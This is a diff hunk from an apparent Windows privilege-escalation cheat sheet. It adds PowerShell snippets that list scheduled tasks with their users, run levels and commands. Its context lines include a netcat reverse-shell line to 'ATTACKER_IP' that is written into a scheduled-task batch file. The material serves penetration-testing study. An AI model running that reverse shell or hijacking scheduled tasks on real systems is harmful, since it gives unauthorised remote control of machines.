@@ -468,6 +468,43 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 schtasks /run /tn vulntask //to run the scheduled task
 ```
 
+Enumerate Powershell scheduled tasks
+
+```
+Get-ScheduledTask |
+    Where-Object TaskPath -NotLike '\Microsoft\*' |
+    ForEach-Object {
+        foreach ($action in $_.Actions) {
+            [PSCustomObject]@{
+                Task    = "$($_.TaskPath)$($_.TaskName)"
+                User    = $_.Principal.UserId
+                Execute = $action.Execute
+                Args    = $action.Arguments
+            }
+        }
+    } |
+    Format-Table -AutoSize
+```
+
+```
+Get-ScheduledTask |
+    ForEach-Object {
+        $task = $_
+
+        foreach ($action in $task.Actions) {
+            [PSCustomObject]@{
+                Task     = "$($task.TaskPath)$($task.TaskName)"
+                User     = $task.Principal.UserId
+                RunLevel = $task.Principal.RunLevel
+                Execute  = $action.Execute
+                Arguments = $action.Arguments
+                WorkDir  = $action.WorkingDirectory
+            }
+        }
+    } |
+    Format-Table -AutoSize
+```
+
 ---
 
 # 10. Registry Permissions
